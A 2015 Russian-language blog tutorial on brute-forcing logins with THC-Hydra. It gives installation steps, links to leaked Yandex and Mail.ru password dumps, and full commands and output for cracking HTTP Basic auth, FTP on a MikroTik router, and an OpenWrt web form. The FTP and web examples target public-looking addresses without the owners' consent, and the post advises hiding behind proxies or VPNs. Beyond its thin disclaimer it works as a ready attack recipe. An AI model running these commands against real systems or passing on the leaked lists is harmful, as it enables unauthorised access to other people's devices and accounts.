---
title: Брутим пароли с Гидрой (hydra)
date: 2015-08-12T10:05:15+00:00
aliases:
  - /hack/hydra-bruteforce-passwd.html
featured_image: /images/posts/hydra-wide.jpg
tags:
  - access
  - bruteforce
  - centos
  - hack
  - linux
  - security
---

> Статья носит носит строго познавательный характер, за применение кем либо описанных в статье методик автор ответственности не несет.

В тот момент, когда пинтест заходит в тупик - одним из крайних аргументов в тесте на проникновение является подбор паролей. Сервисы, к которым можно применить данный метод атаки - самые различные. А как следствие - различны и протоколы, и форматы обращений. Надо бы как то унифицировать инструменты для решения этой задачи - не хорошо под каждый новый случай писать новый брутер своими ручками.

<!--more-->

И такой инструмент уже имеет место быть. Быстрый, сочный, достойный внимания - [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra). Версия 7.5 (_из репозитория epel_) поддерживает подбор по/для: `asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp`. Примеры эксплуатации мы рассмотрим чуть ниже, а пока - посмотрим как можно заполучить данный инструмент в свой арсенал.

### Установка

Пользователям CentOS будет достаточно подключить репозиторий `epel` и выполнить:

```bash
# yum install -y epel-release
$ yum install -y hydra
```

Или для сборки из сорсов (актуально для linux, *bsd, solaris и т.д., а так же MacOS и мобильных системах, базирующихся на Linux):

```bash
$ mkdir ~/hydra_src && cd ~/hydra_src
$ wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip && unzip master.zip && rm -f master.zip
$ cd thc-hydra-master/
$ yum install gcc mysql-devel libssh
# Для Debian - libmysqld-dev и libssh-dev
$ make clean && ./configure
$ make && make install
$ ./hydra -h
Hydra v8.2-dev 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
  -w / -W TIME  waittime for responses (32s) / between connects per thread
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
  -O        use old SSL v2 and v3
  -q        do not print messages about connection errors
  -U        service module usage details
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

> По умолчанию бинарники гидры будут в директории `/usr/local/bin/`, ежели что пропиши этот путь в `~/.bash_profile`, дописав его в переменной `PATH`.

> При сборке из сорсов мы разумеется получаем самую свежую и сочную версию. В репах как правило лежит уже несколько устаревшая.

И ещё более простой вариант - использовать дистрибутив [Kali Linux](https://www.kali.org/downloads/) - там уже всё есть.

### Словари

Брутить можно как с помощью подбора посимвольно, так и с помощью подготовленного словаря наиболее часто используемых паролей. Таки рекомендую первым делом попытаться подобрать пароль со словарем, и уже если и этот способ не увенчался успехом - переходить к прямому бруту посмивольно.

Где взять словари? Например, можно [пошариться на этой странице](https://wiki.skullsecurity.org/Passwords) или глянуть сразу [здесь](https://downloads.skullsecurity.org/passwords/) - имена архивов более чем говорящие. От себя лишь скажу, что использую в основном 3 словаря:

- Очень маленький и очень популярный (_топ первые 500 паролей_)
- Второй побольше - на 5000 паролей
- Третий от Cain & Abel на ~300000 паролей

И в таком же порядке их применяю во время теста. Второй словарь - это слитые воедино несколько других не менее популярных списков (_отсортированный с удалением дубликатов и комментариев_) который можно получить, например, так:

```bash
$ cat twitter-banned.txt 500-worst-passwords.txt lower john.txt password | grep -v '^#' | sort -u > all_small_dic.txt
```

В качестве бонуса можешь забрать готовые списки паролей (_top500; top4000; cain&abel (300k); пароли от яндекса (700k); пароли от маил.ру (2740k); маил.ру + яндекс (3300k)_):

- [passwords_list.zip][passwords_list]

В общем, считаем что словари у тебя готовы к применению. Как пользоваться гидрой?

### Я есть ~~Грут~~ Брут

Какие настройки и возможности предоставляет нам гидра? Давай рассмотрим флаги запуска по порядку:

Флаг | Описание
---- | --------
`-R` | Восстановить предыдущую сессию, которая по какой-либо причине была прервана
`-S` | Использовать SSL соединение
`-s PORT` | Указание порта (_отличного от дефолтного_) сервиса
`-l LOGIN` | Использовать указанный логин для попытки аутентификации
`-L FILE` | Использовать список логинов из указанного файла
`-p PASS` | Использовать указанный пароль для попытки аутентификации
`-P FILE` | Использовать список паролей из указанного файла
`-x` | Генерировать пароли для подбора самостоятельно, указывается в формате `-x MIN:MAX:CHARSET`, где `MIN` - это минимальная длинна пароля, `MAX` - соответственно, максимальная, а `CHARSET` - это набор символов, в котором `a` означает латиницу в нижнем регистре, `A` - в верхнем регистре, `1` - числа, а для указания дополнительных символов - просто укажи их как есть. Вот несколько примеров генерации паролей: `-x 3:5:a` - длинной от 3 до 5 символов, состоящие только из символов латиницы в нижнем регистре; `-x 5:8:A1` - длинной от 5 до 8 символов, состоящие из символов латиницы в верхнем регистре + цифр; `-x 1:3:/` - длинной от 1 до 3 символов, состоящие только из символов слеша `/`; `-x 5:5:/%,.-` - длинной в 5 символов, состоящие только из символов `/%,.-`
`-e nsr` | Укажи `n` для проверки пустых паролей, `s` для попытки использования в качестве пароля - логин, и (_или_) `r` для попытки входа под перевернутым логином
`-u` | Пытаться подобрать логин а не пароль
`-C FILE` | Использовать файл в формате `login:pass` вместо указания `-L`/`-P`
`-M FILE` | Файл со списком целей для брутфорса (_можно с указанием порта через двоеточие_), по одному на строку
`-o FILE` | Записать подобранную пару логин/пароль в файл, вместо того чтоб просто вывести в stdout (_будет указан с указанием сервера, к которому подобран - не запутаешься_)
`-f / -F` |  Прекратить работу, как только первая пара логин:пароль будет подобрана. `-f` только для текущего хоста,`-F` - глобально
`-t TASKS` | Количество параллельных процессов (_читай - потоков_). По умолчанию 16
`-w` | Таймаут _для ответа_ сервера. По умолчанию 32 секунды
`-W` | Таймаут _между_ ответами сервера
`-4 / -6` | Использовать IPv4 (_по умолчанию_) или IPv6 адреса (при указании с `-M` всегда заключай в `[]`)
`-v` | Более подробный вывод информации о процессе
`-V` | Выводить каждый подбираемый логин + пароль
`-d` | Режим дебага
`-O` | Использовать старый `SSL v2` и `v3`
`-q` | Не выводить сообщения об ошибках подключения
`-U` | Дополнительная информация о использовании выбранного модуля
`-h` | Вывод справочной информации

### Гидра - фас!

Теперь давай рассмотрим пример работы на определенных целях. Все IP - вымышленные, соответствие с реальными - чистейшей воды совпадение ;)

> Ахтунг! Юзай proxy/socks/vpn для безопасности собственной задницы. Так, сугубо на всякий случай

#### Basic Authentication

Например, сканируя диапазон адресов мы натыкаемся на некоторый интерфейс, доступный по http протоколу, но закрытый для доступа при помощи Basic Authentication ([пример настройки с помощью nginx](http://nginx.org/ru/docs/http/ngx_http_auth_basic_module.html)):

![screen](https://habrastorage.org/files/2b8/736/1f8/2b87361f8217444ea5a12e36482fac53)

И у нас стоит задача вспомнить наш же забытый пароль ;) Давай определимся с тем, какие данные у нас есть:

- IP сервера `192.168.1.2`
- Сервис `http`
- Путь, который закрыт для нас запросом пары логин:пароль `/private/`
- Порт, на котором работает http сервер `80` (_стандартный_)

Предположим (_или любым доступным путем выясним_), что логин используется `admin`, и нам неизвестен лишь пароль. Подбирать будем с помощью заранее подготовленного словаря и с использованием модуля `http-get`:

```bash
$ hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 13:01:25
[DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task
[DATA] attacking service http-get on port 80
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "!" - 1 of 488 [child 0]
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "!!!" - 2 of 488 [child 1]
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "!!!!" - 3 of 488 [child 2]
...
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "administrat0r" - 250 of 488 [child 0]
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "administrator" - 251 of 488 [child 2]
[ATTEMPT] target 192.168.1.2 - login "admin" - pass "administrator1" - 252 of 488 [child 13]
[80][http-get] host: 192.168.1.2   login: admin   password: admin
#                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
[STATUS] attack finished for 192.168.1.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:01:26

$ cat ./hydra_result.log
# Hydra v8.1 run at 2015-08-12 13:01:25 on 192.168.1.2 http-get (hydra -l admin -P /root/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/)
[80][http-get] host: 192.168.1.2   login: admin   password: admin
#                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

```

Пабам - и через 1 секунду _стандартный_ пароль `admin` успешно сбручен!

#### FTP

Другой пример - случайно находим в сети роутер MikroTik, да с открытыми наружу портами 80 (http) и 21 (ftp). Решаем сообщить его владельцу о наличии данной неприятности, но для этого нужно сперва получить доступ к этому самому микротику.

Брутить вебморду микротика можно, но проходит это значительно медленнее, чем например брутить ftp. А мы знаем, что стандартный логин на микротиках `admin`, и используется один пароль ко всем сервисам. Получив пароль для ftp - получим доступ ко всему остальному:

![screenshot](https://habrastorage.org/files/01f/0d6/e97/01f0d6e979af4ac6a654c89a7923fd02)

Исходные данные:

- IP сервера `178.72.83.246`
- Сервис `ftp`
- Стандартный логин `admin`
- Порт, на котором работает ftp сервер `21` (_стандартный_)

Запускаем гидру:

```bash
$ hydra -l admin -P ~/pass_lists/all_small_dic.txt -o ./hydra_result.log -f -V -s 21 178.72.83.246 ftp
```

И наблюдаем процесс подбора (_~900 паролей в минуту_):

```bash
[DATA] max 16 tasks per 1 server, overall 64 tasks, 4106 login tries (l:1/p:4106), ~4 tries per task
[DATA] attacking service ftp on port 21
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "" - 1 of 4106 [child 0]
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "!@#$%" - 2 of 4106 [child 1]
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "!@#$%^" - 3 of 4106 [child 2]
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "!@#$%^&" - 4 of 4106 [child 3]
...
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "adminadmin" - 249 of 488 [child 5]
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "administrat0r" - 250 of 488 [child 0]
[ATTEMPT] target 178.72.83.246 - login "admin" - pass "administrator" - 251 of 488 [child 14]
[21][ftp] host: 178.72.83.246   login: admin   password: adminadmin
#                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
[STATUS] attack finished for 178.72.83.246 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:46:51
```

Спустя каких то 30 секунд ещё один словарный пароль `adminadmin` был успешно подобран. После этого успешно логинимся в веб-панель:

![screenshot](https://habrastorage.org/files/7c2/bba/0cb/7c2bba0cbb864ce6953a3a7adcf0dc9c)

Выясняем контакты администратора, сообщаем ему о наличии уязвимости, и больше ничего не делаем ;)

#### Веб - авторизация

Например - мы забыли пароль к роутеру, который использует веб-авторизацию. Т.е. не просто "выплывающее окошко браузера", а полноценные поля для ввода пары логин:пароль. Давай попытаемся подобрать пароль и к нему. В рассматриваемом примере это OpenWrt:

![screenshot](https://habrastorage.org/files/ad2/e6d/ba9/ad2e6dba902c4c07adddcdda88ae4ba8)

Открываем панель отладки браузера (`F12` в Chromium-based браузерах), вкладка `Network` и отмечаем галочкой `Preserve log`. После этого вводим пароль, например, `test_passw0rd` (_логин у нас уже введен_), жмем кнопку "Login", и смотрим в консоли что и куда уходит:

![screenshot](https://habrastorage.org/files/3c8/62d/0d0/3c862d0d07034913a3e285feb5f3fe5c)

Отлично, теперь давай подытожим те данные, которыми мы располагаем:

- IP сервера `178.72.90.181`
- Сервис `http` на стандартном `80` порту
- Для авторизации используется html форма, которая отправляет по адресу `http://178.72.90.181/cgi-bin/luci` методом `POST` запрос вида `username=root&password=test_passw0rd`
- В случае не удачной аутентификации пользователь наблюдает сообщение `Invalid username and/or password! Please try again.`

Приступим к запуску гидры:

```bash
$ hydra -l root -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
```

И тут надо кое-что пояснить. Мы используем `http-post-form` потому как авторизация происходит по `http` методом `post`. После указания этого модуля идет строка `/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username`, у которой через двоеточие (`:`) указывается:

1. Путь до скрипта, который обрабатывает процесс аутентификации. В нашем случае это `/cgi-bin/luci`
1. Строка, которая передается методом POST, в которой логин и пароль заменены на `^USER^` и `^PASS^` соответственно. У нас это `username=^USER^&password=^PASS^`
1. Строка, которая **присутствует** на странице при **неудачной** аутентификации. При её **отсутствии** гидра поймет что мы успешно вошли. В нашем случае это `Invalid username`

Подбор в моем случае идет довольно медленно (_~16 паролей в минуту_), и связано это в первую очередь с качеством канала и способностью железки обрабатывать запросы. Как мы видим - ей довольно тяжело это делать:

```bash
Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:15:12
[DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task
[DATA] attacking service http-post-form on port 80
[ATTEMPT] target 178.72.90.181 - login "root" - pass "!" - 1 of 488 [child 0]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "!!!" - 2 of 488 [child 1]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "!!!!" - 3 of 488 [child 2]
# ...
[ATTEMPT] target 178.72.90.181 - login "root" - pass "%username%1" - 18 of 488 [child 1]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "%username%12" - 19 of 488 [child 2]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "%username%123" - 20 of 488 [child 15]
[STATUS] 20.00 tries/min, 20 tries in 00:01h, 468 to do in 00:24h, 16 active

```

Подбор пароля по словарю ничего нам не дал, поэтому мы запустим посимвольный перебор. Длину пароля возьмем от 5 до 9 символов, латиницу в нижнем регистре с цифрами и символами `!@#`:

```bash
$ hydra -l root -x "5:9:a1\!@#" -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
```

И видим что процесс успешно запустился:

```bash
Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:31:01
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 16 tasks per 1 server, overall 64 tasks, 268865638400000 login tries (l:1/p:268865638400000), ~262564100000 tries per task
[DATA] attacking service http-post-form on port 80
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaaa" - 1 of 268865638400000 [child 0]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaab" - 2 of 268865638400000 [child 1]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaac" - 3 of 268865638400000 [child 2]
# ...
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaa7" - 30 of 268865638400000 [child 0]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaa8" - 31 of 268865638400000 [child 2]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaa9" - 32 of 268865638400000 [child 1]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaa@" - 33 of 268865638400000 [child 11]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaa#" - 34 of 268865638400000 [child 4]
[ATTEMPT] target 178.72.90.181 - login "root" - pass "aaaba" - 35 of 268865638400000 [child 7]
```

И понимая безысходность данного подхода останавливаем процесс, возвращаясь к перебору по большому словарю.

Кстати, для запуска hydra в фоне с продолжением её работы после того, как ты отключишься от ssh можно поступить следующим образом:

```bash
$ hydra -bla -bla -bla -o ./hydra_result.log
# Нажимаем CTRL + Z
$ disown -h %1
# После этого отключаемся или продолжаем работу
# Для возврата к процессу перебора выполни '$ bg 1'

# Для того, чтоб после посмотреть работает ли гидра выполни:
$ ps ax | grep hydra

# А для того чтоб убить все процессы с гидрой:
$ for proc in $(ps ax | grep hydra | cut -d" " -f 1); do kill $proc; done;
```

### Вместо заключения

Не ленись настраивать на своих сервисах/железках защиту от брутфорса. Не используй фуфлыжные пароли. Не расценивай данный материал как призыв к каким-либо действиям. Используй для тестирования **своих** сервисов.

[passwords_list]:https://yadi.sk/d/2eXZv4s33aM4Hw
